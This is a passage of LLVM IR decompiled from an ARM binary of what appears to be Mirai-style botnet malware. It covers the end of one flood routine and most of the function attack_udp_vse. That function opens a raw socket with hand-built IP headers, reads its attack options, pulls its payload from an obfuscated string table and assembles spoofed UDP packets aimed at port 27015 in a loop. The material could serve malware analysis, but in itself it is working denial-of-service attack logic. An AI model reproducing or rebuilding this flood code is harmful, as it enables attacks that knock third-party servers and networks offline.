  %v4_b364 = add i32 %v3_b364, 2
  %v5_b364 = inttoptr i32 %v4_b364 to i16*
  store i16 %v1_b358, i16* %v5_b364, align 2
  br i1 %v2_b360, label %dec_label_pc_b20c, label %dec_label_pc_b36c

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b200, %dec_label_pc_b358
  %v0_b36c = load i32, i32* @r5, align 4
  %v1_b36c = add i32 %v0_b36c, 28
  store i32 %v1_b36c, i32* @r4, align 4
  store i32 %v1_b36c, i32* %r0.global-to-local, align 4
  store i32 %v0_b048, i32* %r1.global-to-local, align 4
  %v2_b378 = call i32 @rand_alphastr(i32 %v1_b36c, i32 %v0_b048)
  store i32 %v2_b378, i32* %r0.global-to-local, align 4
  store i32 %v0_b048, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b384 = load i32, i32* @r4, align 4
  %v4_b384 = add i32 %v3_b384, %v0_b048
  %v5_b384 = inttoptr i32 %v4_b384 to i8*
  store i8 0, i8* %v5_b384, align 1
  br label %dec_label_pc_b20c

dec_label_pc_b38c:                                ; preds = %dec_label_pc_b08c, %dec_label_pc_b38c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b398 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_b398, i32* %r0.global-to-local, align 4
  store i32 %v2_aec8, i32* %ip.global-to-local, align 4
  %v3_b3a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3a0, i32* %r1.global-to-local, align 4
  %v2_b3a4 = load i32, i32* @r4, align 4
  %v5_b3a4 = mul i32 %v2_b3a4, 4
  %v6_b3a4 = add i32 %v5_b3a4, %v2_aec8
  %v7_b3a4 = inttoptr i32 %v6_b3a4 to i32*
  store i32 %v2_b398, i32* %v7_b3a4, align 4
  %v0_b3a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_b3a8 = mul i32 %v1_b3a8, 4
  %v5_b3a8 = add i32 %v4_b3a8, %v0_b3a8
  %v6_b3a8 = inttoptr i32 %v5_b3a8 to i32*
  %v7_b3a8 = load i32, i32* %v6_b3a8, align 4
  store i32 %v7_b3a8, i32* %r3.global-to-local, align 4
  %v1_b3ac = inttoptr i32 %v7_b3a8 to i8*
  %v2_b3ac = load i8, i8* %v1_b3ac, align 1
  %tmp56 = urem i8 %v2_b3ac, 16
  %v1_b3b0 = zext i8 %tmp56 to i32
  %v1_b3b4 = or i32 %v1_b3b0, 64
  store i32 %v1_b3b4, i32* %r2.global-to-local, align 4
  %v1_b3b8 = trunc i32 %v1_b3b4 to i8
  store i8 %v1_b3b8, i8* %v1_b3ac, align 1
  %v0_b3bc = load i32, i32* %r3.global-to-local, align 4
  %v1_b3bc = inttoptr i32 %v0_b3bc to i8*
  %v2_b3bc = load i8, i8* %v1_b3bc, align 1
  %v1_b3c0 = and i8 %v2_b3bc, -16
  %v1_b3c4 = or i8 %v1_b3c0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_b3c4, i8* %v1_b3bc, align 1
  %v0_b3d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3d0 = trunc i32 %v0_b3d0 to i8
  %v2_b3d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3d0 = add i32 %v2_b3d0, 9
  %v4_b3d0 = inttoptr i32 %v3_b3d0 to i8*
  store i8 %v1_b3d0, i8* %v4_b3d0, align 1
  %v2_b3d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 1
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i8*
  store i8 %v5_af00, i8* %v4_b3d8, align 1
  store i32 %v5_af3c, i32* %ip.global-to-local, align 4
  %v0_b3e0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b3e0 = mul i32 %v0_b3e0, 32
  store i32 %v3_b3e0, i32* %r0.global-to-local, align 4
  %v2_b3e4 = load i32, i32* %r3.global-to-local, align 4
  %v3_b3e4 = add i32 %v2_b3e4, 8
  %v4_b3e4 = inttoptr i32 %v3_b3e4 to i8*
  store i8 %v1_b15c, i8* %v4_b3e4, align 1
  %v0_b3e8 = load i32, i32* @sb, align 4
  %v1_b3e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3e8 = add i32 %v1_b3e8, 12
  %v3_b3e8 = inttoptr i32 %v2_b3e8 to i32*
  store i32 %v0_b3e8, i32* %v3_b3e8, align 4
  %v0_b3ec = load i32, i32* %r0.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r1.global-to-local, align 4
  %tmp57 = mul i32 %v1_b3ec, -8
  %v5_b3ec = add i32 %v0_b3ec, %tmp57
  %v1_b3f0 = load i32, i32* @r7, align 4
  %v2_b3f0 = add i32 %v5_b3ec, %v1_b3f0
  store i32 %v2_b3f0, i32* %r2.global-to-local, align 4
  %v1_b3f4 = add i32 %v2_b3f0, 16
  %v2_b3f4 = inttoptr i32 %v1_b3f4 to i32*
  %v3_b3f4 = load i32, i32* %v2_b3f4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_b3fc = load i32, i32* %r3.global-to-local, align 4
  %v2_b3fc = add i32 %v1_b3fc, 16
  %v3_b3fc = inttoptr i32 %v2_b3fc to i32*
  store i32 %v3_b3f4, i32* %v3_b3fc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_b404 = load i32, i32* %r1.global-to-local, align 4
  %v1_b404 = add i32 %v0_b404, 1
  store i32 %v1_b404, i32* @r4, align 4
  %v0_b408 = load i32, i32* @r6, align 4
  %v1_b408 = trunc i32 %v0_b408 to i16
  %v2_b408 = load i32, i32* %r3.global-to-local, align 4
  %v3_b408 = add i32 %v2_b408, 2
  %v4_b408 = inttoptr i32 %v3_b408 to i16*
  store i16 %v1_b408, i16* %v4_b408, align 2
  %v0_b40c = load i32, i32* %r3.global-to-local, align 4
  %v1_b40c = add i32 %v0_b40c, 20
  store i32 %v1_b40c, i32* %r1.global-to-local, align 4
  %v0_b410 = load i32, i32* @r8, align 4
  %v1_b410 = trunc i32 %v0_b410 to i16
  %v3_b410 = add i32 %v0_b40c, 4
  %v4_b410 = inttoptr i32 %v3_b410 to i16*
  store i16 %v1_b410, i16* %v4_b410, align 2
  %v0_b414 = load i32, i32* %r2.global-to-local, align 4
  %v1_b414 = trunc i32 %v0_b414 to i16
  %v2_b414 = load i32, i32* %r3.global-to-local, align 4
  %v3_b414 = add i32 %v2_b414, 6
  %v4_b414 = inttoptr i32 %v3_b414 to i16*
  store i16 %v1_b414, i16* %v4_b414, align 2
  %v0_b418 = load i32, i32* @sl, align 4
  %v1_b418 = trunc i32 %v0_b418 to i16
  %v2_b418 = load i32, i32* %r3.global-to-local, align 4
  %v3_b418 = add i32 %v2_b418, 20
  %v4_b418 = inttoptr i32 %v3_b418 to i16*
  store i16 %v1_b418, i16* %v4_b418, align 2
  store i32 %v4_b178, i32* %r3.global-to-local, align 4
  %v0_b420 = load i32, i32* @r4, align 4
  %v1_b420 = load i32, i32* %r0.global-to-local, align 4
  %v0_b424 = load i32, i32* @r5, align 4
  %v1_b424 = trunc i32 %v0_b424 to i16
  %v2_b424 = load i32, i32* %r1.global-to-local, align 4
  %v3_b424 = add i32 %v2_b424, 4
  %v4_b424 = inttoptr i32 %v3_b424 to i16*
  store i16 %v1_b424, i16* %v4_b424, align 2
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = trunc i32 %v0_b428 to i16
  %v2_b428 = load i32, i32* %r1.global-to-local, align 4
  %v3_b428 = add i32 %v2_b428, 2
  %v4_b428 = inttoptr i32 %v3_b428 to i16*
  store i16 %v1_b428, i16* %v4_b428, align 2
  %v0_b42c = load i32, i32* @r4, align 4
  store i32 %v0_b42c, i32* %stack_var_-44, align 4
  %v5_b430 = icmp slt i32 %v0_b420, %v1_b420
  br i1 %v5_b430, label %dec_label_pc_b38c, label %dec_label_pc_b1a4.preheader

dec_label_pc_b438:                                ; preds = %dec_label_pc_b20c, %dec_label_pc_b1a4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b43c = call i32 @__GI_time(i32* null)
  store i32 %v2_b43c, i32* %r0.global-to-local, align 4
  store i32 %v2_afe0, i32* %r3.global-to-local, align 4
  %v6_b448 = icmp slt i32 %v2_afe0, %v2_b43c
  br i1 %v6_b448, label %dec_label_pc_b44c, label %dec_label_pc_b1a4

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b438, %entry, %dec_label_pc_b458
  %v1_b454 = phi i32 [ %v3_aff4, %entry ], [ %v1_b45c, %dec_label_pc_b458 ], [ %v2_b43c, %dec_label_pc_b438 ]
  store i32 %v27_ae9c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b454

dec_label_pc_b458:                                ; preds = %dec_label_pc_b004
  %v0_b458 = load i32, i32* @fp, align 4
  store i32 %v0_b458, i32* %r0.global-to-local, align 4
  %v1_b45c = call i32 @__GI___libc_close(i32 %v0_b458)
  store i32 %v1_b45c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b44c

; uselistorder directives
  uselistorder i32 %v1_b45c, { 1, 0 }
  uselistorder i32 %v0_b358, { 1, 0 }
  uselistorder i32 %v0_b344, { 1, 0 }
  uselistorder i32 %v1_b33c, { 1, 0 }
  uselistorder i32 %v5_b304, { 1, 0 }
  uselistorder i32 %v3_b2b8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_b284, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b24c, { 1, 0 }
  uselistorder i32 %v4_b23c, { 1, 0 }
  uselistorder i32 %v0_b22c, { 1, 0, 2 }
  uselistorder i32 %v2_b21c, { 1, 0 }
  uselistorder i1 %v2_b360, { 1, 0 }
  uselistorder i32 %v1_b164, { 1, 0 }
  uselistorder i32 %v3_b0e0, { 1, 0 }
  uselistorder i32 %v3_b0dc, { 1, 0 }
  uselistorder i32 %v3_b0d8, { 1, 0 }
  uselistorder i32 %v1_b098, { 2, 3, 1, 0 }
  uselistorder i32 %v1_b094, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_b068, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_b05c, { 1, 0 }
  uselistorder i32 %v0_b048, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_aff4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_afe0, { 1, 0 }
  uselistorder i32 %v1_afbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_af7c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_af48, { 2, 1, 0 }
  uselistorder i32 %v5_af3c, { 0, 2, 1 }
  uselistorder i32 %v7_af04, { 1, 0, 2, 3 }
  uselistorder i32 %v6_aee0, { 1, 2, 0 }
  uselistorder i32 %v2_aec8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_b44c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b38c, { 1, 0 }
  uselistorder label %dec_label_pc_b36c, { 1, 0 }
  uselistorder label %dec_label_pc_b20c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1a4, { 1, 0 }
  uselistorder label %dec_label_pc_b100, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_b468 = load i32, i32* @r4, align 4
  %v27_b468 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_b494 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_b498 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r7, align 4
  store i32 %v0_b4a0, i32* %r3.global-to-local, align 4
  store i32 %v2_b494, i32* @sb, align 4
  %v0_b4a8 = load i32, i32* @r5, align 4
  %v5_b4ac = inttoptr i32 %v0_b498 to i32*
  %v6_b4ac = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4ac, i32 2, i32 %v0_b4a0, i32 ptrtoint (i32* @0 to i32))
  %v1_b4b8 = urem i32 %v6_b4ac, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b4bc = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  %v5_b4cc = trunc i32 %v6_b4ac to i8
  %v6_b4d0 = inttoptr i32 %v0_b4bc to i32*
  %v7_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v6_b4d0, i32 3, i32 65535, i32 %v6_b4ac)
  %v0_b4d4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r5, align 4
  %v5_b4e8 = inttoptr i32 %v0_b4d4 to i32*
  %v6_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v5_b4e8, i32 4, i32 64, i32 %v7_b4d0)
  %v0_b4f0 = load i32, i32* @r4, align 4
  %v1_b4f4 = urem i32 %v6_b4e8, 256
  store i32 %v1_b4f4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_b4fc = load i32, i32* @r7, align 4
  store i32 %v0_b4fc, i32* %r3.global-to-local, align 4
  %v0_b500 = load i32, i32* @r5, align 4
  %sext5 = mul i32 %v6_b4e8, 16777216
  %v5_b508 = sdiv i32 %sext5, 16777216
  %v6_b508 = inttoptr i32 %v0_b4f0 to i32*
  %v7_b508 = call i32 @attack_get_opt_int(i32 %v0_b500, i32* %v6_b508, i32 5, i32 %v0_b4fc, i32 %v5_b508)
  %v1_b514 = urem i32 %v7_b508, 256
  store i32 %v1_b514, i32* %ip.global-to-local, align 4
  %v0_b518 = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b524 = load i32, i32* @r5, align 4
  %v5_b52c = inttoptr i32 %v0_b518 to i32*
  %v6_b52c = call i32 @attack_get_opt_int(i32 %v0_b524, i32* %v5_b52c, i32 6, i32 65535, i32 %v1_b514)
  %v0_b534 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b544 = load i32, i32* @r5, align 4
  %v5_b548 = inttoptr i32 %v0_b534 to i32*
  %v6_b548 = call i32 @attack_get_opt_int(i32 %v0_b544, i32* %v5_b548, i32 7, i32 27015, i32 %v6_b52c)
  store i32 %v6_b548, i32* @r4, align 4
  %v0_b550 = load i32, i32* @r7, align 4
  store i32 %v0_b550, i32* %stack_var_-48, align 4
  %v1_b558 = inttoptr i32 %v0_b550 to i32*
  %v2_b558 = call i32 @__GI_time(i32* %v1_b558)
  %v1_b55c = load i32, i32* @r6, align 4
  %v2_b55c = add i32 %v1_b55c, %v2_b558
  %v1_b568 = call i32 @table_unlock_val(i32 32)
  %v3_b574 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8b8, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %v6_b52c, i32* %r2.global-to-local, align 4
  %v0_b5cc = load i32, i32* @r4, align 4
  %v3_b5d0 = mul i32 %v6_b52c, 65536
  store i32 %v3_b5d0, i32* %ip.global-to-local, align 4
  %v3_b5d4 = urem i32 %v7_b4d0, 65536
  store i32 %v3_b5d4, i32* %r3.global-to-local, align 4
  %v3_b5d8 = urem i32 %v6_b52c, 65536
  %v3_b5dc = urem i32 %v0_b5cc, 65536
  %v0_b5e0 = load i32, i32* @fp, align 4
  %v2_b5e0 = icmp eq i32 %v0_b5e0, 0
  %v0_b5e4 = load i32, i32* @r7, align 4
  store i32 %v0_b5e4, i32* %stack_var_-44, align 4
  br i1 %v2_b5e0, label %dec_label_pc_b724.preheader, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5c0
  %tmp38 = mul i32 %v7_b4d0, 256
  %v3_b600 = and i32 %tmp38, 65280
  store i32 %v3_b600, i32* %r3.global-to-local, align 4
  %tmp39 = mul i32 %v0_b5cc, 256
  %v3_b604 = and i32 %tmp39, 65280
  %tmp40 = udiv i32 %v7_b4d0, 256
  %v4_b60c = urem i32 %tmp40, 256
  %v5_b60c = or i32 %v4_b60c, %tmp38
  %tmp41 = udiv i32 %v0_b5cc, 256
  %v4_b610 = urem i32 %tmp41, 256
  %v5_b610 = or i32 %v4_b610, %v3_b604
  store i32 %v5_b610, i32* @lr, align 4
  %tmp42 = mul i32 %v6_b52c, 256
  %v3_b614 = and i32 %tmp42, 65280
  store i32 %v3_b614, i32* %r2.global-to-local, align 4
  %v5_b618 = trunc i32 %v5_b60c to i16
  %tmp43 = udiv i32 %v6_b52c, 256
  %v4_b620 = urem i32 %tmp43, 256
  %v5_b620 = or i32 %v4_b620, %v3_b614
  store i32 %v5_b620, i32* @r6, align 4
  store i32 %v0_b5e4, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b610, 65536
  %v4_b6f0 = sdiv i32 %sext, 65536
  %v1_b69c = trunc i32 %v5_b508 to i8
  br label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %.thread, %dec_label_pc_b5f8
  %v2_b630 = call i32 @calloc(i32 128, i32 1)
  %v3_b634 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b634, i32* %r2.global-to-local, align 4
  %v1_b638 = load i32, i32* @sb, align 4
  %v2_b638 = load i32, i32* @r4, align 4
  %v5_b638 = mul i32 %v2_b638, 4
  %v6_b638 = add i32 %v5_b638, %v1_b638
  %v7_b638 = inttoptr i32 %v6_b638 to i32*
  store i32 %v2_b630, i32* %v7_b638, align 4
  %v0_b63c = load i32, i32* %r2.global-to-local, align 4
  %v3_b63c = mul i32 %v0_b63c, 32
  store i32 %v3_b63c, i32* %r3.global-to-local, align 4
  %v0_b640 = load i32, i32* @sb, align 4
  %v4_b640 = mul i32 %v0_b63c, 4
  %v5_b640 = add i32 %v0_b640, %v4_b640
  %v6_b640 = inttoptr i32 %v5_b640 to i32*
  %v7_b640 = load i32, i32* %v6_b640, align 4
  store i32 %v7_b640, i32* @lr, align 4
  %v5_b644 = mul i32 %v0_b63c, 24
  store i32 %v5_b644, i32* %r3.global-to-local, align 4
  %v1_b648 = load i32, i32* @r8, align 4
  %v2_b648 = add i32 %v1_b648, %v5_b644
  store i32 %v2_b648, i32* @r5, align 4
  %v1_b64c = inttoptr i32 %v7_b640 to i8*
  %v2_b64c = load i8, i8* %v1_b64c, align 1
  %tmp = urem i8 %v2_b64c, 16
  %v1_b650 = zext i8 %tmp to i32
  %v1_b654 = or i32 %v1_b650, 64
  store i32 %v1_b654, i32* %r3.global-to-local, align 4
  %v1_b65c = trunc i32 %v1_b654 to i8
  store i8 %v1_b65c, i8* %v1_b64c, align 1
  %v0_b660 = load i32, i32* @lr, align 4
  %v1_b660 = inttoptr i32 %v0_b660 to i8*
  %v2_b660 = load i8, i8* %v1_b660, align 1
  %v1_b664 = and i8 %v2_b660, -16
  %v1_b668 = or i8 %v1_b664, 5
  store i8 %v1_b668, i8* %v1_b660, align 1
  %v2_b674 = load i32, i32* @lr, align 4
  %v3_b674 = add i32 %v2_b674, 1
  %v4_b674 = inttoptr i32 %v3_b674 to i8*
  store i8 %v5_b4cc, i8* %v4_b674, align 1
  %v3_b678 = load i32, i32* %stack_var_-48, align 4
  %v3_b67c = mul i32 %v3_b678, 65536
  %v1_b680 = add i32 %v3_b67c, 2097152
  %v3_b684 = udiv i32 %v1_b680, 256
  %v1_b688 = and i32 %v3_b684, 65280
  %v4_b68c = udiv i32 %v1_b680, 16777216
  %v5_b68c = or i32 %v1_b688, %v4_b68c
  store i32 %v5_b68c, i32* %r3.global-to-local, align 4
  store i32 %v1_b514, i32* %r4.global-to-local, align 4
  %v3_b698 = urem i32 %v3_b678, 65536
  store i32 %v3_b698, i32* %r2.global-to-local, align 4
  %v2_b69c = load i32, i32* @lr, align 4
  %v3_b69c = add i32 %v2_b69c, 8
  %v4_b69c = inttoptr i32 %v3_b69c to i8*
  store i8 %v1_b69c, i8* %v4_b69c, align 1
  %v0_b6a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6a0 = trunc i32 %v0_b6a0 to i16
  %v2_b6a0 = load i32, i32* @lr, align 4
  %v3_b6a0 = add i32 %v2_b6a0, 2
  %v4_b6a0 = inttoptr i32 %v3_b6a0 to i16*
  store i16 %v1_b6a0, i16* %v4_b6a0, align 2
  %v0_b6a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6a4 = mul i32 %v0_b6a4, 65536
  %v3_b6ac = add i32 %v1_b6a4, 786432
  store i32 %v3_b6ac, i32* %r2.global-to-local, align 4
  %v2_b6b0 = load i32, i32* @lr, align 4
  %v3_b6b0 = add i32 %v2_b6b0, 4
  %v4_b6b0 = inttoptr i32 %v3_b6b0 to i16*
  store i16 %v5_b618, i16* %v4_b6b0, align 2
  %v0_b6b4 = load i32, i32* %r2.global-to-local, align 4
  %v3_b6b4 = udiv i32 %v0_b6b4, 256
  %v1_b6b8 = and i32 %v3_b6b4, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v4_b6bc = udiv i32 %v0_b6b4, 16777216
  %v5_b6bc = or i32 %v1_b6b8, %v4_b6bc
  store i32 %v5_b6bc, i32* %ip.global-to-local, align 4
  %v2_b6c4 = load i32, i32* @lr, align 4
  %v3_b6c4 = add i32 %v2_b6c4, 9
  %v4_b6c4 = inttoptr i32 %v3_b6c4 to i8*
  store i8 17, i8* %v4_b6c4, align 1
  %v0_b6c8 = load i32, i32* %r4.global-to-local, align 4
  %v2_b6c8 = icmp eq i32 %v0_b6c8, 0
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_b6c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_b628
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_b6d4 = load i32, i32* @lr, align 4
  %v4_b6d4 = add i32 %v3_b6d4, 6
  %v5_b6d4 = inttoptr i32 %v4_b6d4 to i16*
  store i16 64, i16* %v5_b6d4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b628, %bb
  %v2_b6d8 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_b6d8, i32* %r2.global-to-local, align 4
  %v1_b6dc = load i32, i32* @lr, align 4
  %v2_b6dc = add i32 %v1_b6dc, 12
  %v3_b6dc = inttoptr i32 %v2_b6dc to i32*
  store i32 %v2_b6d8, i32* %v3_b6dc, align 4
  %v0_b6e0 = load i32, i32* @r5, align 4
  %v1_b6e0 = add i32 %v0_b6e0, 16
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i32*
  %v3_b6e0 = load i32, i32* %v2_b6e0, align 4
  store i32 %v3_b6e0, i32* %r3.global-to-local, align 4
  %v0_b6e4 = load i32, i32* @lr, align 4
  %v1_b6e4 = add i32 %v0_b6e4, 20
  store i32 %v1_b6e4, i32* %r4.global-to-local, align 4
  %v0_b6e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b6e8 = trunc i32 %v0_b6e8 to i16
  %v3_b6e8 = add i32 %v0_b6e4, 24
  %v4_b6e8 = inttoptr i32 %v3_b6e8 to i16*
  store i16 %v1_b6e8, i16* %v4_b6e8, align 2
  %v0_b6ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b6ec = load i32, i32* @lr, align 4
  %v2_b6ec = add i32 %v1_b6ec, 16
  %v3_b6ec = inttoptr i32 %v2_b6ec to i32*
  store i32 %v0_b6ec, i32* %v3_b6ec, align 4
  store i32 %v4_b6f0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_b6f8 = load i32, i32* @lr, align 4
  %v2_b6f8 = add i32 %v1_b6f8, 28
  %v3_b6f8 = inttoptr i32 %v2_b6f8 to i32*
  store i32 -1, i32* %v3_b6f8, align 4
  %v0_b6fc = load i32, i32* %ip.global-to-local, align 4
  %v1_b6fc = trunc i32 %v0_b6fc to i16
  %v2_b6fc = load i32, i32* %r4.global-to-local, align 4
  %v3_b6fc = add i32 %v2_b6fc, 2
  %v4_b6fc = inttoptr i32 %v3_b6fc to i16*
  store i16 %v1_b6fc, i16* %v4_b6fc, align 2
  %v0_b700 = load i32, i32* @lr, align 4
  %v1_b700 = add i32 %v0_b700, 32
  %v0_b704 = load i32, i32* @r6, align 4
  %v1_b704 = trunc i32 %v0_b704 to i16
  %v3_b704 = add i32 %v0_b700, 20
  %v4_b704 = inttoptr i32 %v3_b704 to i16*
  store i16 %v1_b704, i16* %v4_b704, align 2
  %v3_b708 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_b708, i32* %r2.global-to-local, align 4
  %v3_b70c = call i32 @util_memcpy(i32 %v1_b700, i32 %v3_b574, i32 %v3_b708)
  %v3_b710 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b710, i32* %r3.global-to-local, align 4
  %v1_b714 = add i32 %v3_b710, 1
  store i32 %v1_b714, i32* @r4, align 4
  %v1_b718 = load i32, i32* @fp, align 4
  store i32 %v1_b714, i32* %stack_var_-44, align 4
  %v5_b720 = icmp slt i32 %v1_b714, %v1_b718
  br i1 %v5_b720, label %dec_label_pc_b628, label %dec_label_pc_b724.preheader

dec_label_pc_b724.preheader:                      ; preds = %.thread, %dec_label_pc_b5c0
  %v0_b728.ph = phi i32 [ 0, %dec_label_pc_b5c0 ], [ %v1_b718, %.thread ]
  %v3_b740 = icmp eq i32 %v3_b5d4, 65535
  br label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b724.preheader, %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge
  %v0_b728 = phi i32 [ %v0_b728.pre, %dec_label_pc_b8a4.dec_label_pc_b724_crit_edge ], [ %v0_b728.ph, %dec_label_pc_b724.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b728 = icmp eq i32 %v0_b728, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b728, label %dec_label_pc_b8a4, label %dec_label_pc_b734

dec_label_pc_b734:                                ; preds = %dec_label_pc_b724
  br label %dec_label_pc_b7e8

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b7e8
  br i1 %v3_b740, label %dec_label_pc_b870, label %dec_label_pc_b748

